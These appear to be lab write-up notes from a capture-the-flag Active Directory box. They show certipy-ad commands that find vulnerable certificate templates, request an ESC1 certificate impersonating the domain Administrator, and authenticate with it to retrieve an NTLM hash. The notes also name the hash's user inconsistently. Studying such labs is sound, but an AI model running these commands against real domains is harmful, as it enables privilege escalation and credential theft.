
When an HTTPS Server is running on an AD Box, there could be an potential that we can do retrieve information or even exploit an internal CA or receive user hashes.

```
certipy-ad find -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -dc-ip 10.201.64.95 -target thm.local -vulnerable -enabled
```

## ESC1 PrivEsc

![[Pasted image 20260510015119.png]]

This command requests a certificate file "administrator.pfx" for the user Administrator by using SUSANNA_MCKNIGHT's credentials to impersonate that user's UPN with the ServerAuth template.

```
certipy-ad req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca 'thm-LABYRINTH-CA' -template 'ServerAuth' -upn 'administrator@thm.local' -dc-ip 10.113.155.93 -target labyrinth.thm.local
```

This command uses the certificate file administrator.pfx to authenticate to the domain controller and retrieve the NTLM hash for the user BRADLEY_ORTIZ.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.113.155.93
```
